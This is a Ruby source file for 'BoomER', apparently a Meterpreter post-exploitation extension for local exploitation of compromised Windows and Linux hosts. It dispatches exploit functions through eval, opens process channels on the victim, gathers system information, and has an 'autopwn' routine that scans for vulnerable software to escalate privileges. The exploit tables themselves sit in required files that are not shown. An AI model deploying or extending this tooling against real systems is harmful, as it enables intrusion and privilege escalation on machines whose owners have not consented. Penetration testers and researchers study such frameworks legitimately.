# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/boomer/tlv'
require 'rex/post/meterpreter/extensions/boomer/data'
require 'rex/post/meterpreter/extensions/boomer/windows/gathering'
require 'rex/post/meterpreter/extensions/boomer/linux/exploit'
require 'rex/post/meterpreter/extensions/boomer/linux/gathering'
require 'set'

module Rex
module Post
module Meterpreter
module Extensions
module Boomer

###
#
# Boomer extension - Local Exploiting
#
###

###
#
# Authors: Josué Encinar && Antonio Marcos
#
###

class Boomer < Extension
  PY_CODE_TYPE_STRING = 0
  PY_CODE_TYPE_PY     = 1
  PY_CODE_TYPE_PYC    = 2

  #
  # Typical extension initialization routine.
  #
  # @param client (see Extension#initialize)
  def initialize(client)
    super(client, 'boomer')
    puts ""
    puts "BoomER - Local Exploiting!"
    @platform = client.platform
    @target = client.sys.config.sysinfo['OS']
    puts "Client running on " + @target
    client.register_extension_aliases(
      [
        {
          'name' => 'boomer',
          'ext'  => self
        }
      ])
      @windows_gathering = Rex::Post::Meterpreter::Extensions::Boomer::Windows::Gathering.new(client)
      @linux_exploit = Rex::Post::Meterpreter::Extensions::Boomer::Linux::Exploit.new(client)
      @linux_gathering = Rex::Post::Meterpreter::Extensions::Boomer::Linux::Gathering.new(client)
      @exploits = EXPLOITS
      @gathering = GATHERING
      @to_check_dic = DATA_CHECK
      @red = "\e[1;31m"
      @green = "\e[0;32m"
      @yellow = "\e[0;33m"
      @blue = "\e[0;34m"
      @reset = "\e[m"
  end
   
  def start_boomer_console()
    puts "Bye BoomER"
  end

  def boomer_execute(input)
    # Execute it
    exploit = @exploits[input[0]]
    if !exploit
      puts @red + "[-] " + @reset + "Wrong option to execute..."
      return nil
    end
    os = exploit["os"]
    if os != @platform
      puts @red + "[-] " + @reset + "This exploit is for " + os + " systems"
      return nil
    end
    function = exploit['function']
    out = eval("#{function}")
    if out
      puts out
      open_channel(out)
    end
  end

  def open_channel(cmd)
    request = Packet.create_request('boomer_open_channel')
    request.add_tlv(TLV_TYPE_PROCESS_PATH, client.unicode_filter_decode(cmd));
    result = client.send_request(request)
    pid        = result.get_tlv_value(TLV_TYPE_PID)
    handle     = result.get_tlv_value(TLV_TYPE_PROCESS_HANDLE)
    channel_id = result.get_tlv_value(TLV_TYPE_CHANNEL_ID)
    channel = nil

    if (channel_id != nil)
      channel = Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(client,
          channel_id, "boomer", CHANNEL_FLAG_SYNCHRONOUS)
    end
    obj = [channel, pid, handle]  
    return obj
  end

  def boomer_check(input)
    begin
      request = Packet.create_request('boomer_check')
      data = @to_check_dic[input[0]]
      if data
        request.add_tlv(TLV_TYPE_PYTHON_RESULT, data['command'])
        result = run_exec_request(request)
        check_result(input[0], result)
      else
        puts(@red + "[-] " + @reset + "#{input} no accepted")
      end
    rescue Exception => e
      puts e.message
    end
  end

  def list_check()
    list_aux(@to_check_dic)
  end

  def list_info()
    list_aux(@gathering)
  end

  def list_exploit()
    list_aux(@exploits)
  end

  def get_info(input)
    begin
      function = input[0]
      data = @gathering[function]
      if data && input.length == 2
        eval "#{data['function']}('#{input[1]}')"
      elsif data
        eval("#{data['function']}")
      else
        puts @red + "Review " + data + @reset
      end
    rescue Exception => e
      puts e.message
    end
  end

  def autopwn()
    puts "AutoPwn Checking..."
    @to_check_dic.each do |key, value|
      if value["os"] == @platform
        boomer_check([key])
      end
    end
  end

  private

  def list_aux(dic)
    dic.each do |key, value|
      if value["os"] == @platform
        puts @blue + key + @reset + ": " + value["description"]
        if value["examples"]
          puts @yellow + "Usage examples: " +@reset
          value["examples"].each do |v|
            puts v
          end
        end
      end
    end
  end

  def check_result(app, result)
    if result[:result]
      r = result[:result]
      if r.include? "Error"
        puts(@red + "[-] " + @reset +"#{app} no found")
        return
      end
      success = false
      data = @to_check_dic[app]['versions']
      if data
        data.each do |key|
          key_a = key.keys[0]
          if r.include? key_a
            puts(@green + "[+] " + @reset +"#{app} #{key_a} --> #{key[key_a]}")
            success = true
          end
        end
      end
      if !success
        puts("[i] #{app} no vulnerable")
      end
    else
      puts(@red + "[-] " + @reset + "Impossible to get results")

    end
  end


  def run_exec_request(request)
    response = client.send_request(request)
    result = {
      result: response.get_tlv_value(TLV_TYPE_PYTHON_RESULT),
      stdout: "",
      stderr: ""
    }

    response.each(TLV_TYPE_PYTHON_STDOUT) do |o|
      result[:stdout] << o.value
    end

    response.each(TLV_TYPE_PYTHON_STDERR) do |e|
      result[:stderr] << e.value
    end

    result
  end

end

end; end; end; end; end